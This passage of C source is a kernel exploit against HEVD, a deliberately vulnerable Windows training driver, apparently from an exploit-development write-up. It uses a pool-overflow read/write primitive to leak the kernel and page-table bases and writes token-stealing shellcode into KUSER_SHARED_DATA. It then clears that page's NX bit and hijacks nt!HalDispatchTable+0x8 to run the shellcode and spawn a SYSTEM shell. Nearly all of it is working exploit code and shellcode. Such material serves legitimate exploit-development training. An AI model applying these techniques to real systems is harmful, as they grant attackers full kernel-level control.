    printf("[+] Target HEVD.sys address with pointer to ntoskrnl.exe: 0x%llx\n", ntiatLeak);

    // Assign the target address to the corrupted object
    helperobjectArray[index].Name = &ntiatLeak;

    // Set the Name member of the "corrupted" object managed by the global array. The main object is currently set to the Name member of one of the sprayed ARW_HELPER_OBJECT_NON_PAGED_POOL_NX that was corrupted via the pool overflow
    DeviceIoControl(
        driverHandle,
        0x00222067,
        &helperobjectArray[index],
        sizeof(helperobjectArray[index]),
        NULL,
        NULL,
        &bytesreturnedreadPrimtitve,
        NULL
    );

    // Declare variable that will receive the address of nt!ExAllocatePoolWithTag and initialize it
    unsigned long long ntPointer = 0x9090909090909090;

    // Setting the Name member of the main object to the address of the ntPointer variable. When the Name member is dereferenced and bubbled back up to user mode, it will overwrite the value of ntPointer
    mainObject.Name = &ntPointer;

    // Perform the "Get" operation on the main object, which should now have the Name member set to the IAT entry from HEVD
    DeviceIoControl(
        driverHandle,
        0x0022206b,
        &mainObject,
        sizeof(mainObject),
        &mainObject,
        sizeof(mainObject),
        &bytesreturnedreadPrimtitve,
        NULL
    );

    // Print the pointer to nt!ExAllocatePoolWithTag
    printf("[+] Leaked ntoskrnl.exe pointer! nt!ExAllocatePoolWithTag: 0x%llx\n", ntPointer);

    // Assign a variable the base of the kernel (static offset)
    unsigned long long kernelBase = ntPointer - 0x9b3160;

    // Print the base of the kernel
    printf("[+] ntoskrnl.exe base address: 0x%llx\n", kernelBase);

    // Assign a variable with nt!MiGetPteAddress+0x13
    unsigned long long migetpteAddress = kernelBase + 0x222073;

    // Print update
    printf("[+] nt!MiGetPteAddress+0x13: 0x%llx\n", migetpteAddress);

    // Assign the target address to the corrupted object
    helperobjectArray[index].Name = &migetpteAddress;

    // Set the Name member of the "corrupted" object managed by the global array to obtain the base of the PTEs
    DeviceIoControl(
        driverHandle,
        0x00222067,
        &helperobjectArray[index],
        sizeof(helperobjectArray[index]),
        NULL,
        NULL,
        &bytesreturnedreadPrimtitve,
        NULL
    );

    // Declare a variable that will receive the base of the PTEs
    unsigned long long pteBase = 0x9090909090909090;

    // Setting the Name member of the main object to the address of the pteBase variable
    mainObject.Name = &pteBase;

    // Perform the "Get" operation on the main object
    DeviceIoControl(
        driverHandle,
        0x0022206b,
        &mainObject,
        sizeof(mainObject),
        &mainObject,
        sizeof(mainObject),
        &bytesreturnedreadPrimtitve,
        NULL
    );

    // Print update
    printf("[+] Base of the page table entries: 0x%llx\n", pteBase);

    // Calculate the PTE page for our shellcode in KUSER_SHARED_DATA
    unsigned long long shellcodePte = 0xfffff78000000800 >> 9;
    shellcodePte = shellcodePte & 0x7FFFFFFFF8;
    shellcodePte = shellcodePte + pteBase;

    // Print update
    printf("[+] KUSER_SHARED_DATA+0x800 PTE page: 0x%llx\n", shellcodePte);

    // Assign the target address to the corrupted object
    helperobjectArray[index].Name = &shellcodePte;

    // Set the Name member of the "corrupted" object managed by the global array to obtain the address of the shellcode PTE page
    DeviceIoControl(
        driverHandle,
        0x00222067,
        &helperobjectArray[index],
        sizeof(helperobjectArray[index]),
        NULL,
        NULL,
        &bytesreturnedreadPrimtitve,
        NULL
    );

    // Declare a variable that will receive the PTE bits
    unsigned long long pteBits = 0x9090909090909090;

    // Setting the Name member of the main object
    mainObject.Name = &pteBits;

    // Perform the "Get" operation on the main object
    DeviceIoControl(
        driverHandle,
        0x0022206b,
        &mainObject,
        sizeof(mainObject),
        &mainObject,
        sizeof(mainObject),
        &bytesreturnedreadPrimtitve,
        NULL
    );

    // Print update
    printf("[+] PTE bits for shellcode page: %p\n", pteBits);

    // Store nt!HalDispatchTable+0x8
    unsigned long long halTemp = kernelBase + 0xc00a68;

    // Assign the target address to the corrupted object
    helperobjectArray[index].Name = &halTemp;

    // Set the Name member of the "corrupted" object managed by the global array to obtain the pointer at nt!HalDispatchTable+0x8
    DeviceIoControl(
        driverHandle,
        0x00222067,
        &helperobjectArray[index],
        sizeof(helperobjectArray[index]),
        NULL,
        NULL,
        &bytesreturnedreadPrimtitve,
        NULL
    );

    // Declare a variable that will receive [nt!HalDispatchTable+0x8]
    unsigned long long halDispatch = 0x9090909090909090;

    // Setting the Name member of the main object
    mainObject.Name = &halDispatch;

    // Perform the "Get" operation on the main object
    DeviceIoControl(
        driverHandle,
        0x0022206b,
        &mainObject,
        sizeof(mainObject),
        &mainObject,
        sizeof(mainObject),
        &bytesreturnedreadPrimtitve,
        NULL
    );

    // Print update
    printf("[+] Preserved [nt!HalDispatchTable+0x8] value: 0x%llx\n", halDispatch);

    // Arbitrary write primitive

    /*
        ; Windows 10 19H1 x64 Token Stealing Payload
        ; Author Connor McGarr
        [BITS 64]
        _start:
            mov rax, [gs:0x188]       ; Current thread (_KTHREAD)
            mov rax, [rax + 0xb8]     ; Current process (_EPROCESS)
            mov rbx, rax              ; Copy current process (_EPROCESS) to rbx
        __loop:
            mov rbx, [rbx + 0x448]    ; ActiveProcessLinks
            sub rbx, 0x448            ; Go back to current process (_EPROCESS)
            mov rcx, [rbx + 0x440]    ; UniqueProcessId (PID)
            cmp rcx, 4                ; Compare PID to SYSTEM PID
            jnz __loop                ; Loop until SYSTEM PID is found
            mov rcx, [rbx + 0x4b8]    ; SYSTEM token is @ offset _EPROCESS + 0x360
            and cl, 0xf0              ; Clear out _EX_FAST_REF RefCnt
            mov [rax + 0x4b8], rcx    ; Copy SYSTEM token to current process
            xor rax, rax              ; set NTSTATUS STATUS_SUCCESS
            ret                       ; Done!
    */

    // Shellcode
    unsigned long long shellcode[9] = { 0 };
    shellcode[0] = 0x00018825048B4865;
    shellcode[1] = 0x000000B8808B4800;
    shellcode[2] = 0x04489B8B48C38948;
    shellcode[3] = 0x000448EB81480000;
    shellcode[4] = 0x000004408B8B4800;
    shellcode[5] = 0x8B48E57504F98348;
    shellcode[6] = 0xF0E180000004B88B;
    shellcode[7] = 0x48000004B8888948;
    shellcode[8] = 0x0000000000C3C031;

    // Assign the target address to write to the corrupted object
    unsigned long long kusersharedData = 0xfffff78000000800;

    // Create a "counter" for writing the array of shellcode
    int counter = 0;

    // For loop to write the shellcode
    for (int i = 0; i <= 9; i++)
    {
        // Setting the corrupted object to KUSER_SHARED_DATA+0x800 incrementally 9 times, since our shellcode is 9 QWORDS
        // kusersharedData variable, managing the current address of KUSER_SHARED_DATA+0x800, is incremented by 0x8 at the end of each iteration of the loop
        helperobjectArray[index].Name = &kusersharedData;

        // Setting the Name member of the main object to specify what we would like to write
        mainObject.Name = &shellcode[counter];

        // Set the Name member of the "corrupted" object managed by the global array to KUSER_SHARED_DATA+0x800, incrementally
        DeviceIoControl(
            driverHandle,
            0x00222067,
            &helperobjectArray[index],
            sizeof(helperobjectArray[index]),
            NULL,
            NULL,
            &bytesreturnedreadPrimtitve,
            NULL
        );

        // Perform the arbitrary write via "set" to overwrite each QWORD of KUSER_SHARED_DATA+0x800 until our shellcode is written
        DeviceIoControl(
            driverHandle,
            0x00222067,
            &mainObject,
            sizeof(mainObject),
            NULL,
            NULL,
            &bytesreturnedreadPrimtitve,
            NULL
        );

        // Increase the counter
        counter++;

        // Increase the counter
        kusersharedData += 0x8;
    }

    // Print update
    printf("[+] Successfully wrote the shellcode to KUSER_SHARED_DATA+0x800!\n");

    // Taint the PTE contents to corrupt the NX bit in KUSER_SHARED_DATA+0x800
    unsigned long long taintedBits = pteBits & 0x0FFFFFFFFFFFFFFF;

    // Print update
    printf("[+] Tainted PTE contents: %p\n", taintedBits);

    // Leverage the arbitrary write primitive to corrupt the PTE contents

    // Setting the Name member of the corrupted object to specify where we would like to write
    helperobjectArray[index].Name = &shellcodePte;

    // Specify what we would like to write (the tainted PTE contents)
    mainObject.Name = &taintedBits;

    // Set the Name member of the "corrupted" object managed by the global array to KUSER_SHARED_DATA+0x800's PTE virtual address
    DeviceIoControl(
        driverHandle,
        0x00222067,
        &helperobjectArray[index],
        sizeof(helperobjectArray[index]),
        NULL,
        NULL,
        &bytesreturnedreadPrimtitve,
        NULL
    );

    // Perform the arbitrary write
    DeviceIoControl(
        driverHandle,
        0x00222067,
        &mainObject,
        sizeof(mainObject),
        NULL,
        NULL,
        &bytesreturnedreadPrimtitve,
        NULL
    );

    // Print update
    printf("[+] Successfully corrupted the PTE of KUSER_SHARED_DATA+0x800! This region should now be marked as RWX!\n");

    // Leverage the arbitrary write primitive to overwrite nt!HalDispatchTable+0x8

    // Reset kusersharedData
    kusersharedData = 0xfffff78000000800;

    // Setting the Name member of the corrupted object to specify where we would like to write
    helperobjectArray[index].Name = &halTemp;

    // Specify where we would like to write (the address of KUSER_SHARED_DATA+0x800)
    mainObject.Name = &kusersharedData;

    // Set the Name member of the "corrupted" object managed by the global array to nt!HalDispatchTable+0x8
    DeviceIoControl(
        driverHandle,
        0x00222067,
        &helperobjectArray[index],
        sizeof(helperobjectArray[index]),
        NULL,
        NULL,
        &bytesreturnedreadPrimtitve,
        NULL
    );

    // Perform the arbitrary write
    DeviceIoControl(
        driverHandle,
        0x00222067,
        &mainObject,
        sizeof(mainObject),
        NULL,
        NULL,
        &bytesreturnedreadPrimtitve,
        NULL
    );

    // Print update
    printf("[+] Successfully corrupted [nt!HalDispatchTable+0x8]!\n");

    // Locating nt!NtQueryIntervalProfile
    NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(
        GetModuleHandle(
            TEXT("ntdll.dll")),
        "NtQueryIntervalProfile"
    );

    // Error handling
    if (!NtQueryIntervalProfile)
    {
        printf("[-] Error! Unable to find ntdll!NtQueryIntervalProfile! Error: %d\n", GetLastError());
        exit(1);
    }

    // Print update for found ntdll!NtQueryIntervalProfile
    printf("[+] Located ntdll!NtQueryIntervalProfile at: 0x%llx\n", NtQueryIntervalProfile);

    // Calling nt!NtQueryIntervalProfile
    ULONG exploit = 0;
    NtQueryIntervalProfile(
        0x1234,
        &exploit
    );

    // Print update
    printf("[+] Successfully executed the shellcode!\n");

    // Leverage arbitrary write for restoration purposes

    // Setting the Name member of the corrupted object to specify where we would like to write
    helperobjectArray[index].Name = &halTemp;

    // Specify where we would like to write (the address of the preserved value at [nt!HalDispatchTable+0x8])
    mainObject.Name = &halDispatch;

    // Set the Name member of the "corrupted" object managed by the global array to nt!HalDispatchTable+0x8
    DeviceIoControl(
        driverHandle,
        0x00222067,
        &helperobjectArray[index],
        sizeof(helperobjectArray[index]),
        NULL,
        NULL,
        &bytesreturnedreadPrimtitve,
        NULL
    );

    // Perform the arbitrary write
    DeviceIoControl(
        driverHandle,
        0x00222067,
        &mainObject,
        sizeof(mainObject),
        NULL,
        NULL,
        &bytesreturnedreadPrimtitve,
        NULL
    );

    // Print update
    printf("[+] Successfully restored [nt!HalDispatchTable+0x8]!\n");

    // Print update for NT AUTHORITY\SYSTEM shell
    printf("[+] Enjoy the NT AUTHORITY\\SYSTEM shell!\n");

    // Spawning an NT AUTHORITY\SYSTEM shell
    system("cmd.exe /c cmd.exe /K cd C:\\");
}

void main(void)
{
    // Open a handle to the driver
    printf("[+] Obtaining handle to HEVD.sys...\n");

    HANDLE drvHandle = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0x0,
        NULL,
        OPEN_EXISTING,
        0x0,
        NULL
    );

    // Error handling
    if (drvHandle == (HANDLE)-1)
    {
        printf("[-] Error! Unable to open a handle to the driver. Error: 0x%lx\n", GetLastError());
        exit(-1);
    }
    else
    {
        readwritePrimitive(drvHandle);
    }
}
```
